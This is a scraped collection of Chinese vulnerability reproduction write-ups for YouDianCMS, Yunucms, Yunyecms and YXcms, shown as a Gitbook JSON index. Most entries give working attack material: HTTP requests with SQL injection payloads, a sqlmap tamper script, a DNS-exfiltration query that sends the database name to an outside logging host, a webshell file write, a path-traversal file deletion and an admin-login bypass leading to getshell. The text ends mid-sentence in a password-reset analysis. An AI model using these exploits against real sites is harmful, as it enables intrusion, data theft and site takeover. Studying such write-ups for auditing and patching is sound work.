Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:33 "},"Web安全/YouDianCMS/YouDiancms延时注入漏洞和登录绕过漏洞和getshell/YouDiancms延时注入漏洞和登录绕过漏洞和getshell.html":{"url":"Web安全/YouDianCMS/YouDiancms延时注入漏洞和登录绕过漏洞和getshell/YouDiancms延时注入漏洞和登录绕过漏洞和getshell.html","title":"YouDiancms延时注入漏洞和登录绕过漏洞和getshell","keywords":"","body":"YouDiancms延时注入漏洞和登录绕过漏洞和getshell 漏洞描述 YouDiancms是一套企业建站系统，经过代码审计该系统存在多个漏洞 漏洞影响 YouDiancms FOFA icon_hash=\"1728964041\" 漏洞复现 0x01 未授权SQL注入 首先拿到源码一看，发现该系统是基于THINKPHP3开发的。 在App/Lib/Action/HomeBaseAction.class.php:16 cookie可控，然后赋值给了$this->_fromUser 跟踪一下$this->_fromUser的引用。 在App/Lib/Action/Home/ChannelAction.class.php:732 这里将$this->_fromUser带入到了hasVoted函数中，跟进该函数： 很明显，TP3的where注入。 延时注入payload如下: GET /index.php/Channel/voteAdd HTTP/1.1 Host: localhostContent-Length: 2 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: youdianfu[0]=exp;youdianfu[1]==(select 1 from(select sleep(3))a) Connection: close 0x02 绕过登录到getshell过程 0x0201 流程思路 验证码处可以设置任意session 碰撞md5让AdminGroupID==1（超级管理员） 后台修改模板插入phpcode实现代码执行 0x0x202 任意session设置 在App/Lib/Action/BaseAction.class.php:223 这个函数挺有意思的，本来是个生成验证码的操作，但是没想到所有的参数都是用户可以控制的，特别是这个$verifyName还可控。跟进buildImageVerify看看如何设置的session。 红框处设置了session，并且session的键名我们是可控的，但是值不可控，是个md5值。 然后我们去看看管理员的校验函数。在App/Lib/Action/AdminBaseAction.class.php:7 起作用的就两个函数，isLogin和checkPurview。跟进第一个看看： 这个函数很简单，就简单的判断session是否存在，我们可以通过上文的验证码函数来设置。 然后就是checkPurview函数。 这里判断了AdminGroupID的值，当等于1的时候就是超级管理员，由于这里是个弱类型比较。所以上文设置session中的md5是可以碰撞的。 编写脚本得到超级管理员的session了，然后登录。 0x0203 后台getshell 后台模板管理，可以修改模板，但是对 我们可以用来绕过这个检测。 如图所示： 访问首页即可触发： Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:34 "},"Web安全/Yunucms/Yunucms v2.0.7 后台xss/Yunucms v2.0.7 后台xss.html":{"url":"Web安全/Yunucms/Yunucms v2.0.7 后台xss/Yunucms v2.0.7 后台xss.html","title":"Yunucms v2.0.7 后台xss","keywords":"","body":"Yunucms v2.0.7 后台xss 一、漏洞简介 云优CMS是一款基于TP5.0框架为核心开发的一套免费+开源的城市分站内容管理系统。云优CMS前身为远航CMS。云优CMS于2017年9月上线全新版本，二级域名分站，内容分站独立，七牛云存储，自定义字段，自定义表单，自定义栏目权限，自定义管理权限等众多功能深受用户青睐。 二、漏洞影响 Yunucms v2.0.7 三、复现过程 环境搭建 从官网下载源码并进行过安装 需要注意的是需要填云账号，我去官网注册了一个随便填上了，账号testqwe，密码123456，手机号利用的在线短信注册的 填上MySQL密码即可 前台界面 漏洞分析 http://www.0-sec.org/index.php?s=/admin/tagurl/addtagurl 该cms路由为目录/文件/方法，直接查看方法 public function addTagurl() { if(request()->isAjax()){ # 判断是否是ajax请求 $param = input('post.'); # 获取参数 $tagurl = new TagurlModel(); $flag = $tagurl->insertTagurl($param); # 将结果进行保存并返回响应 return json(['code' => $flag['code'], 'data' => $flag['data'], 'msg' => $flag['msg']]); } return $this->fetch(); } 跟进insertTagurl方法 public function insertTagurl($param) { try{ $result = $this->allowField(true)->save($param); # 保存当前数据对象 if(false === $result){ return ['code' => -1, 'data' => '', 'msg' => $this->getError()]; }else{ return ['code' => 1, 'data' => '', 'msg' => '添加TAG成功']; } }catch( PDOException $e){ return ['code' => -2, 'data' => '', 'msg' => $e->getMessage()]; } } 继续跟进save方法 if (!empty($data)) { // 数据自动验证 if (!$this->validateData($data)) { # 验证集为空，直接返回true return false; } // 数据对象赋值 foreach ($data as $key => $value) { $this->setAttr($key, $value, $data); # 将参数赋值给$this->data数组 } if (!empty($where)) { $this->isUpdate = true; } } ...... $result = $this->getQuery()->insert($this->data); ...... `` validateData方法需要验证集，而本身没有传入 protected function validateData($data, $rule = null, $batch = null) { $info = is_null($rule) ? $this->validate : $rule; if (!empty($info)) { ...... } return true; } 且$this->validate参数为空，因此直接返回true 跟进insert方法 ..... // 生成SQL语句 $sql = $this->builder->insert($data, $options, $replace); $bind = $this->getBind(); if ($options['fetch_sql']) { // 获取实际执行的SQL语句 return $this->connection->getRealSql($sql, $bind); } // 执行操作 $result = $this->execute($sql, $bind); fetch_sql变量为false，跟进execute方法 ...... if ($procedure) { # false $this->bindParam($bind); } else { $this->bindValue($bind); } ...... 最后跟进参数绑定方法 protected function bindValue(array $bind = []) { foreach ($bind as $key => $val) { // 占位符 $param = is_numeric($key) ? $key + 1 : ':' . $key; if (is_array($val)) { if (PDO::PARAM_INT == $val[1] && '' === $val[0]) { $val[0] = 0; } $result = $this->PDOStatement->bindValue($param, $val[0], $val[1]); } else { $result = $this->PDOStatement->bindValue($param, $val); } if (!$result) { throw new BindParamException( \"Error occurred when binding parameters '{$param}'\", $this->config, $this->getLastsql(), $bind ); } } } 可以看到最后是调用PDO对象对参数进行的绑定，除此之外并没有任何过滤，因此XSS代码可插入并执行 漏洞复现 后台TAG管理模块 进行添加TAG 在名称处填入XSS代码并提交 返回模块即可看到效果 查看源码，发现已经插入 查看数据库 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:38 "},"Web安全/Yunucms/Yunucms v2.0.7 数据库泄露/Yunucms v2.0.7 数据库泄露.html":{"url":"Web安全/Yunucms/Yunucms v2.0.7 数据库泄露/Yunucms v2.0.7 数据库泄露.html","title":"Yunucms v2.0.7 数据库泄露","keywords":"","body":"Yunucms v2.0.7 数据库泄露 一、漏洞简介 云优CMS是一款基于TP5.0框架为核心开发的一套免费+开源的城市分站内容管理系统。云优CMS前身为远航CMS。云优CMS于2017年9月上线全新版本，二级域名分站，内容分站独立，七牛云存储，自定义字段，自定义表单，自定义栏目权限，自定义管理权限等众多功能深受用户青睐。 二、漏洞影响 Yunucms v2.0.7 三、复现过程 漏洞分析 POST /index.php?s=/admin/data/export HTTP/1.1 public function export($ids = null, $id = null, $start = null) { $Request = Request::instance(); if ($Request->isPost() && !empty($ids) && is_array($ids)) { //初始化 $path = config('data_backup_path'); is_dir($path) || mkdir($path, 755, true); //读取备份配置 $config = [ 'path' => realpath($path) . DIRECTORY_SEPARATOR, 'part' => config('data_backup_part_size'), 'compress' => config('data_backup_compress'), 'level' => config('data_backup_compress_level'), ]; //检查是否有正在执行的任务 $lock = \"{$config['path']}backup.lock\"; if (is_file($lock)) { return $this->error('检测到有一个备份任务正在执行，请稍后再试，或手动删除\"'.$lock.'\"后重试！'); } file_put_contents($lock, $Request->time()); //创建锁文件 //检查备份目录是否可写 is_writeable($config['path']) || $this->error('备份目录不存在或不可写，请检查后重试！'); session('backup_config', $config); //生成备份文件信息 $file = [ 'name' => date('Ymd-His', $Request->time()), 'part' => 1, ]; session('backup_file', $file); //缓存要备份的表 session('backup_tables', $ids); //创建备份文件 $Database = new \\com\\Database($file, $config); if (false !== $Database->create()) { $tab = ['id' => 0, 'start' => 0]; return $this->success('初始化成功！', '', ['tables' => $ids, 'tab' => $tab]); } else { return $this->error('初始化失败，备份文件创建失败！'); } } ...... 可以看到，备份文件的命名用的time方法，跟进 public function time($float = false) { return $float ? $_SERVER['REQUEST_TIME_FLOAT'] : $_SERVER['REQUEST_TIME']; } 可以看到利用REQUEST_TIME进行构造文件名，因此可以直接爆破得到并下载。 漏洞复现 在后台系统管理->数据库管理模块将所有数据库备份 查看本地文件，所有备份保存在data目录下，发现名命是以时间命名，可以直接爆破得到 从前台访问并下载 下载完成后打开，泄露所有数据库信息 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:41 "},"Web安全/Yunyecms/Yunyecms V2.0.2 前台注入漏洞（一）/Yunyecms V2.0.2 前台注入漏洞（一）.html":{"url":"Web安全/Yunyecms/Yunyecms V2.0.2 前台注入漏洞（一）/Yunyecms V2.0.2 前台注入漏洞（一）.html","title":"Yunyecms V2.0.2 前台注入漏洞（一）","keywords":"","body":"Yunyecms V2.0.2 前台注入漏洞（一） 一、漏洞简介 云业CMS内容管理系统是由云业信息科技开发的一款专门用于中小企业网站建设的PHP开源CMS，可用来快速建设一个品牌官网(PC，手机，微信都能访问)，后台功能强大，安全稳定，操作简单。 二、漏洞影响 yunyecms 2.0.2 三、复现过程 漏洞分析 下载源码，搭建起来，打开登录页面。 http://127.0.0.1/yunyecms_2.0.2/admin.php?c=login&= 1 打开Seay源代码审计工具，分析代码。经过一番寻找与\"提示\"，发现getip()方法获取ip没有进行过滤，可能有戏。 /media/rId25.png) 搜索getip()函数，发现login.php调用了该函数，变量为$logiparr。 /media/rId26.png) 跟踪该变量，发现CheckLoginTimes函数调用该变量。 /media/rId27.png) 去到该函数定义处，发现我们的ip变量没有进行任何过滤直接由GetCount函数执行。 /media/rId28.png) 漏洞发现 $cnt=$this->db->GetCount(\"select count(*) as total from `#yunyecms_adminloginfail` where ip='$ip' and failtimes>=\".ADMLOGIN_MINUTES.\" and lastlogintime>$checktime limit 1\"); 可以看出，我们可以构造该ip变量达到注入目的，打开burp抓包。 /media/rId30.png) 发送到Repeater模块，构造参数，可以看到sql报错。 /media/rId31.png) 进一步利用，得到数据库名称，漏洞存在。 /media/rId32.png) 漏洞利用 将抓的包保存下来，使用sqlmap去跑就可以了。 sqlmap.py -r C:\\Users\\Administrator\\Desktop\\yunye.txt --batch /media/rId34.png) 参考链接 http://www.freesion.com/article/7074313754/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:43 "},"Web安全/Yunyecms/Yunyecms V2.0.2 前台注入漏洞（二）/Yunyecms V2.0.2 前台注入漏洞（二）.html":{"url":"Web安全/Yunyecms/Yunyecms V2.0.2 前台注入漏洞（二）/Yunyecms V2.0.2 前台注入漏洞（二）.html","title":"Yunyecms V2.0.2 前台注入漏洞（二）","keywords":"","body":"Yunyecms V2.0.2 前台注入漏洞（二） 一、漏洞简介 云业CMS内容管理系统是由云业信息科技开发的一款专门用于中小企业网站建设的PHP开源CMS，可用来快速建设一个品牌官网(PC，手机，微信都能访问)，后台功能强大，安全稳定，操作简单。 二、漏洞影响 yunyecms 2.0.2 三、复现过程 问题出现在前台me***.php文件中，自定义表单customform中的userid从cookie中获取，截取一段数据包可以看到cookie的userid如下： /media/rId24.png) 经过了加密处理，根据解密算法yunyecms_strdecode可以在corefun.php找到对应的加解密算法 /media/rId25.png) 因为cookie里的userid可控因此我们根据算法流程我们可以在cookie中伪造userid值。还是用刚刚以上截取的userid测试。 /media/rId26.png) 可以看到真实的userid为9。构造一个SQL注入，生成如下payload： /media/rId27.png) YmM0OWM5ZWY1ODk5ZGRkNzM0T1NjZ1lXNWtJSE5zWldWd0tEVXA4ZDdlNzk5NTliNDQyYTI1ZDE0ZWUzODZmZDI4MzY5OTM0YQ== payload生成代码front-test.php为： 继续追溯可控的userid,可以看到userid经过步骤3->4->5传递到了pagelist函数中 /media/rId28.png) 跟入pagelist函数，将$where拼接到了sql查询语句中$sqlcnt,然后交给了前几次SQL注入都出现的SQL查询函数GetCount中。 /media/rId29.png) 详细查看下该函数，直接进行了sql查询。 /media/rId30.png) 附上截 /media/rId31.png) 手工有点麻烦，又想丢入sqlmap怎么办，由于userid经过了加密和编码处理，于是根据算法流程写一个tamper就可以很好的解决了， /media/rId32.png) 对应tamper的的脚本为 yunyecms_front_sqli_tamp.py #!/usr/bin/env python \"\"\" Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/) See the file 'LICENSE' for copying permission \"\"\" import base64 import hashlib from lib.core.enums import PRIORITY from lib.core.settings import UNICODE_ENCODING __priority__ = PRIORITY.LOW def dependencies(): pass def md5(data): hash_md5 = hashlib.md5(data) md5data=hash_md5.hexdigest()[8:18] return md5data def sha1(data): string_sha1=hashlib.sha1(data).hexdigest()[0:35] return string_sha1 def yunyecms_strencode(string): salt='~^y#u%n$y^e*c%m^s^~' return base64.b64encode(md5(salt)+base64.b64encode(string)+sha1(salt)) def tamper(payload, **kwargs): \"\"\" Base64-encodes all characters in a given payload >>> tamper(\"1' AND SLEEP(5)#\") 'MScgQU5EIFNMRUVQKDUpIw==' \"\"\" return yunyecms_strencode(payload) if payload else payload Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:45 "},"Web安全/Yunyecms/Yunyecms V2.0.2 后台注入漏洞（一）/Yunyecms V2.0.2 后台注入漏洞（一）.html":{"url":"Web安全/Yunyecms/Yunyecms V2.0.2 后台注入漏洞（一）/Yunyecms V2.0.2 后台注入漏洞（一）.html","title":"Yunyecms V2.0.2 后台注入漏洞（一）","keywords":"","body":"Yunyecms V2.0.2 后台注入漏洞（一） 一、漏洞简介 云业CMS内容管理系统是由云业信息科技开发的一款专门用于中小企业网站建设的PHP开源CMS，可用来快速建设一个品牌官网(PC，手机，微信都能访问)，后台功能强大，安全稳定，操作简单。 二、漏洞影响 yunyecms 2.0.2 三、复现过程 漏洞分析 废话不多说，又经过一番寻找与\"提示\"，发现core/admin/deparment.php文件，其中id值是通过post直接获取的，然后被edit_admin_department()调用。 /media/rId25.png) 去到edit_admin_department()函数定义处，发现过滤语句。 /media/rId26.png) 但是仔细一看，发现代码只是过滤了departmentname和olddepartmentname两个变量，放过了我们的id变量，只是判断id值是否为空。 if($departmentname!=$olddepartmentname){ $num=$this->db->GetCount(\"select count(*) as total from `#yunyecms_department` where departmentname='$departmentname' and departmentid<>$id limit 1\"); if($num){ messagebox(Lan('department_already_exist'),url_admin('department_add','','',$this->hashurl['usvg']),\"warn\"); } } 从代码可以看出，如果departmentname的值不等于olddepartmentname，就执行sql语句，我们的id值没有任何过滤出现在sql语句中，应该有注入无疑了。 漏洞复现 来到core/admin/deparment.php所在的页面，即后台的部门管理处。 /media/rId28.png) 修改部门名字，只要前后名字不一致即可，使用burp抓包。 /media/rId29.png) 发送到Repeater模块，构造参数，可以看到sql报错。 /media/rId30.png) 不想动手，就扔到sqlmap去跑就完事了。 sqlmap.py -r C:\\Users\\Administrator\\Desktop\\yunye.txt --batch /media/rId31.png) 参考链接 http://www.freesion.com/article/9029315473/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:48 "},"Web安全/Yunyecms/Yunyecms V2.0.2 后台注入漏洞（二）/Yunyecms V2.0.2 后台注入漏洞（二）.html":{"url":"Web安全/Yunyecms/Yunyecms V2.0.2 后台注入漏洞（二）/Yunyecms V2.0.2 后台注入漏洞（二）.html","title":"Yunyecms V2.0.2 后台注入漏洞（二）","keywords":"","body":"Yunyecms V2.0.2 后台注入漏洞（二） 一、漏洞简介 云业CMS内容管理系统是由云业信息科技开发的一款专门用于中小企业网站建设的PHP开源CMS，可用来快速建设一个品牌官网(PC，手机，微信都能访问)，后台功能强大，安全稳定，操作简单。 二、漏洞影响 yunyecms 2.0.2 三、复现过程 漏洞出现在在后台文件de***.php中，de***_add函数对GET和POST参数先进行了是否empty判断，最终将传入的几个参数传给了edit_admin_department。 /media/rId24.png) 跟入edit_admin_department，对参数依次进行了处理，但是发现只有$departmentname,$olddepartmentname进行了usafestr安全过滤，漏网的$id拼接到了sql语句中执行。 /media/rId25.png) 最终导致了SQL注入。 /media/rId26.png) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:50 "},"Web安全/YXcms/（CVE-2018-11003）YXcms 1.4.7跨站请求伪造漏洞/（CVE-2018-11003）YXcms 1.4.7跨站请求伪造漏洞.html":{"url":"Web安全/YXcms/（CVE-2018-11003）YXcms 1.4.7跨站请求伪造漏洞/（CVE-2018-11003）YXcms 1.4.7跨站请求伪造漏洞.html","title":"（CVE-2018-11003）YXcms 1.4.7跨站请求伪造漏洞","keywords":"","body":"（CVE-2018-11003）YXcms 1.4.7 跨站请求伪造漏洞 一、漏洞简介 YXcms 1.4.7版本中的protected/apps/admin/controller/adminController.php文件存在跨站请求伪造漏洞。远程攻击者可借助index.php?r=admin/admin/admindel利用该漏洞删除管理员账户。 二、漏洞影响 YXcms 1.4.7 三、复现过程 POC: 管理员点击链接 http://192.168.232.133/evil.html evil.html test Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:01 "},"Web安全/YXcms/YXCMS 1.4.7SQL注入/YXCMS 1.4.7SQL注入.html":{"url":"Web安全/YXcms/YXCMS 1.4.7SQL注入/YXCMS 1.4.7SQL注入.html","title":"YXCMS 1.4.7SQL注入","keywords":"","body":"YXCMS 1.4.7SQL注入 一、漏洞简介 二、漏洞影响 1.4.7 三、复现过程 漏洞分析 查看漏洞文件protected/apps/admin/controller/fragmentController.php的第63行 public function del() { if(!$this->isPost()){ $id=intval($_GET['id']); if(empty($id)) $this->error('您没有选择~'); if(model('fragment')->delete(\"id='$id'\")) echo 1; else echo '删除失败~'; }else{ if(empty($_POST['delid'])) $this->error('您没有选择~'); $delid=implode(',',$_POST['delid']); if(model('fragment')->delete('id in ('.$delid.')')) $this->success('删除成功',url('fragment/index')); } } 我们跟if(model(\\'fragment\\')->delete(\\\"id=\\'$id\\'\\\")),它会先到protected/core.php文件里面的model function model($model){ static $objArray = array(); $className = $model . 'Model'; if( !is_object($objArray[$className]) ){ if( !class_exists($className) ) { throw new Exception(config('_APP_NAME'). '/' . $className . '.php 模型类不存在'); } $objArray[$className] = new $className(); } return $objArray[$className]; } 然后到protected/apps/admin/model/fragmentModel.php 继续protected/base/model/baseModel.php prefix=config('DB_PREFIX'); } } 再来到最底层的数据库操作类protected/base/model/model.php的第45行 public function delete($condition){ return $this->model->table($this->table, $this->ignoreTablePrefix)->where($condition)->delete(); } 这个delete()是从哪里来的，我们来看第十三行的代码,创建了一个对象cpModel static public function connect($config, $force=false){ static $model = NULL; if( $force==true || empty($model) ){ $model = new cpModel($config); } return $model; } 漏洞文件在protected/include/core/cpModel.class.php, public function delete() { $table = $this->options['table']; //当前表 $where = $this->_parseCondition(); //条件 if ( empty($where) ) return false; //删除条件为空时，则返回false，避免数据不小心被全部删除 $this->sql = \"DELETE FROM $table $where\"; $query = $this->db->execute($this->sql); return $this->db->affectedRows(); } 这里用到了一个方法_parseCondition() private function _parseCondition() { $condition = $this->db->parseCondition($this->options); $this->options['where'] = ''; $this->options['group'] = ''; $this->options['having'] = ''; $this->options['order'] = ''; $this->options['limit'] = ''; $this->options['field'] = '*'; return $condition; } } 这个函数是在protected/include/core/db/cpMysql.class.php的128行 public function parseCondition($options) { $condition = \"\"; if(!empty($options['where'])) { $condition = \" WHERE \"; if(is_string($options['where'])) { $condition .= $options['where']; } else if(is_array($options['where'])) { foreach($options['where'] as $key => $value) { $condition .= \" `$key` = \" . $this->escape($value) . \" AND \"; } $condition = substr($condition, 0,-4); } else { $condition = \"\"; } } if( !empty($options['group']) && is_string($options['group']) ) { $condition .= \" GROUP BY \" . $options['group']; } if( !empty($options['having']) && is_string($options['having']) ) { $condition .= \" HAVING \" . $options['having']; } if( !empty($options['order']) && is_string($options['order']) ) { $condition .= \" ORDER BY \" . $options['order']; } if( !empty($options['limit']) && (is_string($options['limit']) || is_numeric($options['limit'])) ) { $condition .= \" LIMIT \" . $options['limit']; } if( empty($condition) ) return \"\"; return $condition; } 里面有一个行数来过滤escape,我们找到74行的这个函数定义 public function escape($value) { if( isset($this->_readLink) ) { $link = $this->_readLink; } elseif( isset($this->_writeLink) ) { $link = $this->_writeLink; } else { $link = $this->_getReadLink(); } if( is_array($value) ) { return array_map(array($this, 'escape'), $value); } else { if( get_magic_quotes_gpc() ) { $value = stripslashes($value); } return \"'\" . mysql_real_escape_string($value, $link) . \"'\"; } } 不过这个函数有一句is_array如果是数组才会执行下面的过滤，如果不是的话就正常执行下去,没有任何sql的过滤就造成了注入漏洞。 复现 这个盲注可以用http://ceye.io和python脚本跑 http://0-sec.org/index.php?r=admin/fragment/index payload: 1 and if((select load_file(concat('\\\\\\\\',(select database()),'.xxxx.ceye.io\\\\abc'))),1,1))-- - 点击删除 post包 POST /index.php?r=admin/fragment/del HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 188 Referer: [url]http://127.0.0.1/index.php?r=admin/fragment/index[/url] Cookie: PHPSESSID=bbei6n32cuevaf1lbi0n79rdj2; Connection: close Upgrade-Insecure-Requests: 1 delid%5B%5D=select LOAD_FILE((CONCAT('\\\\\\\\',(SELECT DATABASE()),'.8571e594.2m1.pw\\\\abc')))&__hash__=529fbedab8a7b8a3f3f5a0f394f51cf2_08ebfXTKPoKd0tX4iq+aFMwhq5QkkRGC/NfUu/Ny83+UmU8u0MoCIj8 然后用burp截获数据，修改内容加上我们的payload，用原文的payload后面+会报错 然后进入http://ceye.io/records/dns 查看我们的数据 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:51 "},"Web安全/YXcms/YXCMS 1.4.7任意文件写入/YXCMS 1.4.7任意文件写入.html":{"url":"Web安全/YXcms/YXCMS 1.4.7任意文件写入/YXCMS 1.4.7任意文件写入.html","title":"YXCMS 1.4.7任意文件写入","keywords":"","body":"YXcms 1.4.7 任意文件写入 一、漏洞简介 二、漏洞影响 YXcms 1.4.7 三、复现过程 漏洞分析 漏洞文件protected/apps/admin/controller/setController.php的140行，$tpfile接收到GET传过来的值，如果为空的话就会报非法操作。传过来的URL是admin/set/tpadd&Mname=default，所以$tpfile就是default。 再来下是检测是否有POST的值，接受到POST过来的filename,用trim去掉两边的空格。接收到POST过来的code，用stripcslashes反转义。 $filepath=$templepath.$filename.\\'.php\\'这一句是路径和文件的拼接，然后下面检测路径是否存在。 最后没有过滤任何的危险函数就传给file_put_contents函数，写入网站的目录。 public function tpadd() { $tpfile=$_GET['Mname']; if(empty($tpfile)) $this->error('非法操作~'); $templepath=BASE_PATH . $this->tpath.$tpfile.'/'; if($this->isPost()){ $filename=trim($_POST['filename']); $code=stripcslashes($_POST['code']); if(empty($filename)||empty($code)) $this->error('文件名和内容不能为空'); $filepath=$templepath.$filename.'.php'; if($this->ifillegal($filepath)) {$this->error('非法的文件路径~');exit;} try{ file_put_contents($filepath, $code); } catch(Exception $e) { $this->error('模板文件创建失败！'); } $this->success('模板文件创建成功！',url('set/tplist',array('Mname'=>$tpfile))); }else{ $this->tpfile=$tpfile; $this->display(); } } 复现 http://0-sec.org/index.php%3Fr%3Dadmin/set/tpadd%26Mname%3Ddefault 打开我们的文件监控软件FolderChangesView，输入我们的程序路径D:\\phpStudy\\PHPTutorial\\WWW\\YXcms 然后写shell.php文件名，写入我们的代码。 然后会在\\protected\\apps\\default\\view\\default下面生成我们写入的文件。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:53 "},"Web安全/YXcms/YXCMS 1.4.7任意文件删除/YXCMS 1.4.7任意文件删除.html":{"url":"Web安全/YXcms/YXCMS 1.4.7任意文件删除/YXCMS 1.4.7任意文件删除.html","title":"YXCMS 1.4.7任意文件删除","keywords":"","body":"YXcms 1.4.7 任意文件删除 一、漏洞简介 二、漏洞影响 YXcms 1.4.7 三、复现过程 漏洞分析 漏洞文件：protected/apps/admin/controller/photoController.php,在第355行的delpic()函数，可以看到$picname接收POST过来的值，然后$path等于文件开头定义的静态变量 static protected $uploadpath=\\'\\';//图片上传路径 没有对传入的值进行任何的过滤，使用函数file_exists()判断一下文件是否存在就给unlink执行删除文件了。 public function delpic() { if(empty($_POST['picname'])) $this->error('参数错误~'); $picname=$_POST['picname']; $path=$this->uploadpath; if(file_exists($path.$picname)) @unlink($path.$picname); else{echo '图片不存在~';return;} if(file_exists($path.'thumb_'.$picname)) @unlink($path.'thumb_'.$picname); else {echo '缩略图不存在~';return;} echo '原图以及缩略图删除成功~'; } 复现 需要先登录后台，然后访问之后会显示缩略图不存在 payload http://0-sec.org/index.php%3Fr%3Dadmin/photo/delpic POST： picname=../../protected/apps/install/install.lock 然后访问网站首页就会自动转到安装的页面 看到目录下的install.lock文件已经被删除了 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:55 "},"Web安全/YXcms/YXCMS 1.4.7储存型xss/YXCMS 1.4.7储存型xss.html":{"url":"Web安全/YXcms/YXCMS 1.4.7储存型xss/YXCMS 1.4.7储存型xss.html","title":"YXCMS 1.4.7储存型xss","keywords":"","body":"YXcms 1.4.7 储存型xss 一、漏洞简介 二、漏洞影响 YXcms 1.4.7 三、复现过程 漏洞分析 前台的文件源码protected/apps/default/controller/columnController.php public function index() { $ename=in($_GET['col']); if(empty($ename)) throw new Exception('栏目名不能为空~', 404); $sortinfo=model('sort')->find(\"ename='{$ename}'\",'id,name,ename,path,url,type,deep,method,tplist,keywords,description,extendid'); $path=$sortinfo['path'].','.$sortinfo['id']; $deep=$sortinfo['deep']+1; $this->col=$ename; switch ($sortinfo['type']) { case 1://文章 $this->newslist($sortinfo,$path,$deep); break; case 2://图集 $this->photolist($sortinfo,$path,$deep); break; case 3://单页 $this->page($sortinfo,$path,$deep); break; case 4://应用 break; case 5://自定义 break; case 6://表单 $this->extend($sortinfo,$path,$deep); break; default: throw new Exception('未知的栏目类型~', 404); break; } } 后台的文件源码protected/apps/admin/controller/extendfieldController.php public function mesedit() { $tableid=intval($_GET['tabid']); if(!$this->checkConPower('extend',$tableid)) $this->error('您没有权限管理此独立表内容~'); $id=intval($_GET['id']);//信息id if(empty($tableid) || empty($id) ) $this->error('参数错误~'); $tableinfo = model('extend')->select(\"id='{$tableid}' OR pid='{$tableid}'\",'id,tableinfo,name,type,defvalue','pid,norder DESC'); if(empty($tableinfo)) $this->error('自定义表不存在~'); if (!$this->isPost()) { $info=model('extend')->Extfind($tableinfo[0]['tableinfo'],\"id='{$id}'\"); $this->info=$info; $this->tableid=$tableid; $this->id=$id; $this->tableinfo=$tableinfo; $this->display(); }else{ for($i=1;$iExtup($tableinfo[0]['tableinfo'],\"id='{$id}'\",$data)) $this->success('修改成功~',url('extendfield/meslist',array('id'=>$tableid))); else $this->error('信息修改失败~'); } } 中间没什么过滤 复现 http://0-sec.org/index.php?r=default/column/index&col=guestbook payload： 然后登陆后台，查看审核 点击编辑 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:11:56 "},"Web安全/YXcms/YXcmsApp 1.4.3任意用户密码重置漏洞/YXcmsApp 1.4.3任意用户密码重置漏洞.html":{"url":"Web安全/YXcms/YXcmsApp 1.4.3任意用户密码重置漏洞/YXcmsApp 1.4.3任意用户密码重置漏洞.html","title":"YXcmsApp 1.4.3任意用户密码重置漏洞","keywords":"","body":"YXcms 1.4.3 任意用户密码重置漏洞 一、漏洞简介 二、漏洞影响 2017-03-26 YXcmsApp 1.4.3 三、复现过程 漏洞原理 从框架上（基于CanPHP的二次开发）看不出来什么缺陷，那就来看看代码逻辑上有什么披露。来到protected/apps/member/controller/indexController.php中是一些关于会员账号的逻辑，其中的getpassword函数是找回密码的功能，其中分为两步：第一步根据用户名或者邮箱向注册的邮件发送重置密码链接；第二步根据重置密码的链接重置用户密码，然后再将新密码发送到对应邮箱。第二步代码如下： 这里的ENCODE_KEY是在安装时生成的6位密钥，想通过构造$_GET[\\'code\\']来重置其他用户的密码初步是不现实的。 但之后又看到在regist功能中，第176行调用了自定义的set_cookie函数，如下： 跟进set_cookie函数，是在protected/include/lib/common.function.php中607行定义，如下： 这里是用ENCODE_KEY对原值进行加密再设置cookie。所以萌生了一个想法，将注册后对应设置的auth cookie作为getpassword的code，就可以正确地进行解密，解密后的内容即为regist函数中第175行拼接的字符串： $cookie_auth = $id.'\\t'.$data['groupid'].'\\t'.$data['account'].'\\t'.$data['nickname'].'\\t'.$data['lastip']; 其中会对account的格式进行校验，ip也是正则匹配的结果无法伪造，那么可控的就只有nickname了，我们可以跟踪一下nickname的过滤过程，首先是进入common.function.php的in函数： 接着就直接连接成字符串，虽然htmlspecialchars函数默认不会对单引号编码，但是addslashes函数会对单引号转义，这里的nickname就无法利用了。 可是再往上看login逻辑时，发现在登陆成功后就会从数据库中取出账号信息，拼接成字符串设置为对应的auth cookie，如下： 我们可以考虑考虑二次注入的可能性，但还是需要跟踪一下在regist时insert数据是如何过滤的，最后可以跟到在protected/include/core/db/cpMysql.class.php中escape函数对数据进行了过滤： 因为在登陆成功后是直接拼接字符串就加密，所以单引号还是能够还原出来的，单引号的整个输入输出过程如下： 所以我们可以注册个带单引号nickname的账号，注册成功后退出重新登陆，使用auth cookie来作为重置密码的code，就会产生报错，如下（因为在解密的时候会把code进行urldecode，所以需要把cookie中的+改为%252B，/改为%252F）： 漏洞证明 漏洞的本质是二次注入 ，但是我们在数据库中可以看到nickname限制为30个字符，而且在这里我们可控的也只有nickname，所以进行报错注入几乎是不可能了。 既然是在找回密码处的二次注入，就看看能不能重置任意用户名的密码。还是再来看看getpassword函数的逻辑： 假如说我们的payload改为\\' or 1=1# 那么肯定是可以将所有用户的密码都update为同一个newpass，这个newpass还是会发给info[\\'email\\']这个邮箱的，跟进187行看看find函数的结果是否是我们可控的，在protected/include/core/cpModel.calss.php中： find函数虽然加了一个limit 